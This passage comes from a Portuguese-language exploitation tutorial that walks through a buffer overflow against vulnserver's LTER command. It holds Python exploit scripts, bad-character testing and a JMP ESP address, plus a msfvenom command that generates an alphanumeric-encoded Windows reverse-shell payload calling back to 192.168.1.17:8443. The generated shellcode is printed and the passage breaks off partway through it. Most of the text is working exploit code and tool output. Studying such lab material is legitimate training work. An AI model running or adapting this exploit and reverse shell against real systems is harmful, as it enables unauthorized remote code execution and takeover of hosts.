<span class="c1"># variaveis de payoad
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">3000</span>

<span class="n">badchars</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="sh">"</span>

<span class="c1"># payload
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">LTER /.</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">badchars</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="err">”</span><span class="n">B</span><span class="err">”</span> <span class="o">*</span> <span class="mi">4</span>
<span class="c1">#payload += b"A" * (2005 - len(badchars))
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd3\x11\x50\x62</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">2005</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>

<span class="c1"># criando conexao
</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando payload...</span><span class="sh">"</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Payload enviado.</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>Monitorando com Immunity:</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-86.png" alt="Enumaração do comando." /></p><p>Ao seguirmos o dump do ESP, podemos ver que nossos caracteres seguiram normalmente do 0x01 até 0x7f, a partir daí, o vulnserver começou a substituir nossos caracteres por outros, o 0x80 por 0x01, o 0x81 por 0x02 e assim por diante.</p><p>Isso explica por que o 0xd3 do nosso JMP ESP foi substituído por 0x09. O que significa que temos uma quantidade limitadíssima de 127 caracteres para fazer todo nosso exploit.</p><p>Precisamos continuar, nosso JMP ESP não funcionou, mas podemos adicionar o comando “ascii” à nossa pesquisa no Immunity, para tentar encontrar um JMP ESP que contenha apensas caracteres ANSI.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-87.png" alt="Enumaração do comando." /></p><p>Temos dois endereços, que por sinal estão na essfunc.dll que acompanha o vulnserver. No meu caso, vou utilizar o 0x62501203.</p><p>Atualizando script.</p><p>xpllter.py:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="c">#!/usr/bin/python3</span>

import socket

<span class="c"># variaveis de conexao</span>
ip <span class="o">=</span> <span class="s2">"192.168.1.30"</span>
porta <span class="o">=</span> 9999

<span class="c"># variaveis de payoad</span>
offset <span class="o">=</span> 3000

<span class="c"># payload</span>
payload <span class="o">=</span> b<span class="s2">"LTER /."</span>
payload +<span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> 2005
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">62"</span>
payload +<span class="o">=</span> b<span class="s2">"C"</span> <span class="k">*</span> <span class="o">(</span>offset - 2005 - 4<span class="o">)</span>

<span class="c"># criando conexao</span>
s <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="o">)</span>
s.connect<span class="o">((</span>ip,porta<span class="o">))</span>
s.recv<span class="o">(</span>1024<span class="o">)</span>

print<span class="o">(</span><span class="s2">"Enviando payload..."</span><span class="o">)</span>

s.send<span class="o">(</span>payload + b<span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>
s.close<span class="o">()</span>

print<span class="o">(</span><span class="s2">"Payload enviado."</span><span class="o">)</span>
</pre></table></code></div></div><p>Vamos inserir um breakpoint em nosso endereço de retorno e monitorar com Immunity.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-88.png" alt="Enumaração do comando." /></p><p>Caímos exatamente em cima do nosso buffer de “C”.</p><p>Podemos criar nosso shellcode, porém, temos uma limitação de caracteres muito grande.</p><p>Por sorte, a suite Metasploit trabalha com vários tipos de encoders, um deles é o x86/alpha_mixed que faz a transcrição do nosso shellcode para bytes alfa numéricos, mais sobre o encode <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">aqui</a>.</p><p>Vamos gerar nosso shellcode:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.1.17 <span class="nv">lport</span><span class="o">=</span>8443 <span class="nv">exitfunc</span><span class="o">=</span>thread <span class="nt">-e</span> x86/alpha_mixed <span class="nt">-b</span> <span class="s1">'\x00'</span> <span class="nv">bufferregister</span><span class="o">=</span>esp <span class="nt">-f</span> py <span class="nt">-v</span> shellcode
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 702 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/alpha_mixed chosen with final size 702
Payload size: 702 bytes
Final size of py file: 3913 bytes
shellcode <span class="o">=</span>  b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">6a"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">51"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">42"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">68"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">50"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">6e"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">4c"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">57"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">31"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">66"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">4d"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">76"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">5a"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">49"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">6b"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">62"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">6b"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">79"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">61"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">34"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">44"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">36"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">4c"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">79"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">70"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">61"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">6f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">34"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">53"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">73"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">4c"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">6c"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">79"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">6d"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">30"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">71"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">6f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">56"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">61"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">4c"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">37"</span>
